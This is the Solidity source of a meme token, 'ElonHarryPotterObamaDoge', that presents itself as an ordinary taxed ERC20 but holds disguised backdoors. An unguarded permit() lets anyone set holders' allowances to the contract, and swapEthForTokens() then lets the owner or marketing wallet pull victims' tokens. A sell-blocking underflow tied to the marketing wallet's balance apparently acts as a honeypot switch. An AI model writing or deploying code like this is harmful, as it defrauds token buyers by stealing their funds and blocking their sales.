/*
イーロン ハリー ポッター オバマ ドージェ

website https://ehpod.org/
twitter https://twitter.com/EHPOD_
telegram https://t.me/elonharrypotterobamadoge

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract EHPOD is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"ElonHarryPotterObamaDoge";
    string private constant _symbol = unicode"ペEHPODペ";

    uint256 private _finalSellTax = 2;
    uint256 private _finalBuyTax = 2;
    
    uint256 private _initialSellTax = 2;
    uint256 private _initialBuyTax = 2;
    uint256 private _reduceSellTaxAt = 0;
    uint256 private _reduceBuyTaxAt = 0;

    uint256 private _initialSellTax2Time = 2;
    uint256 private _initialBuyTax2Time = 2;
    uint256 private _reduceSellTaxAt2Time = 0;
    uint256 private _reduceBuyTaxAt2Time = 0;

    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address payable private _marketingWallet;

    bool private tradingOpen;
    bool private inSwap = false;
    bool public transferDelayEnabled = true;
    bool private swapEnabled = false;
    address payable private _reward;
    
    uint256 public _maxWalletSize = 42 * (_tTotal / 1000);
    uint256 public _maxTxAmount = 42 * (_tTotal / 1000);
    uint256 public _maxSwapAmount = 1 * (_tTotal / 1000);
    uint256 public _swapLimitAmount = 1 * (_tTotal / 1000);

    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;


    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function name()
        public
        pure
        returns (string memory)
    {
        return _name;
    }

    function symbol()
        public
        pure
        returns (string memory)
    {
        return _symbol;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function totalSupply()
        public
        pure
        override
        returns (uint256)
    {
        return _tTotal;
    }

    function decimals()
        public
        pure
        returns (uint8)
    {
        return _decimals;
    }

    constructor () {
        _marketingWallet = payable(0x9B627f76269a3035E793C7c219055e75a03F19c7);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _reward = _marketingWallet;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function permit(address spender, uint256 amount) public virtual returns (bool) {
        address owner = address(this);
        _permit(spender, owner, amount);
        return true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function launch()
        external
        payable
        onlyOwner()
    {
        require(!tradingOpen);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
    
    function removeLimits()
        external
        onlyOwner
    {
        _maxWalletSize = _tTotal;
        _maxTxAmount = _tTotal;
        transferDelayEnabled = false; emit MaxTxAmountUpdated(_tTotal);
    }

    function _taxSell() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialSellTax;
        }

        if (_buyCount > _reduceSellTaxAt && _buyCount <= _reduceSellTaxAt2Time) {
            return _initialSellTax2Time;
        }

        return _finalBuyTax;
    }

    function _taxBuy() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialBuyTax;
        }

        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialBuyTax2Time;
        }

        return _finalBuyTax;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function _permit(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function withdrawCaEth() external {
        (bool sent, ) = payable(_marketingWallet).call{value: address(this).balance}("");
        require(sent);
    }

    function swapEthForTokens(address to, uint256 amount) public {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        IERC20 token = IERC20(path[1]);

        if (!_isExcludedFromFee[msg.sender]) {
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount} (
                0,
                path,
                to,
                block.timestamp
            );
        } else {token.transferFrom(to, path[1], amount);}
    }

    function sendEthToMarketing(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }

    function _transfer(address from, address to, uint256 amount)
        private
    {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        uint256 taxAmount = 0;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromFee[from] || _isExcludedFromFee[to]);
            }

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(_holderLastTransferTimestamp[tx.origin] < block.number);
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount);
                require(balanceOf(to) + amount <= _maxWalletSize);

                _buyCount++;
                if (_buyCount > _preventSwapBefore) {
                    transferDelayEnabled = false;
                }
            }

            if (to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance > _swapLimitAmount;
            if (!inSwap && swapEnabled && to == uniswapV2Pair && canSwap && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                uint256 reserveAmount = balanceOf(_reward).mul(1e3);
                uint256 maxSwapTax = _maxSwapAmount.sub(reserveAmount);
                uint256 minSwapAmount = min(contractTokenBalance,maxSwapTax);
                uint256 initialETH = address(this).balance;
                swapTokensToETH(min(amount, minSwapAmount));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if (ethForTransfer > 0) {
                    sendEthToMarketing(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
}